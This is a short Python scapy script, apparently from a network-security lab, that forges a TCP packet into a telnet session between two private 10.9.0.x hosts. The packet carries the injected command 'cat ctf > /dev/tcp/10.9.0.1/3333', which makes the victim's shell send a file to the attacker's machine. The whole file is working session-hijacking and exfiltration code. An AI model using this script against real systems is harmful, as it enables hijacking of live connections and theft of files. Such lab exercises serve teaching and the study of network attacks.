#!/usr/bin/env python3
from scapy.all import * 


ip = IP(src="10.9.0.5", dst="10.9.0.6") 
tcp = TCP(sport=54866, dport=23, flags="R", seq=2361718719, ack=1563993413) 
data =  "\r cat ctf > /dev/tcp/10.9.0.1/3333 \r"
pkt = ip/tcp/data
ls(pkt) 
send(pkt, iface="br-dae0af9f1ac6", verbose=0)

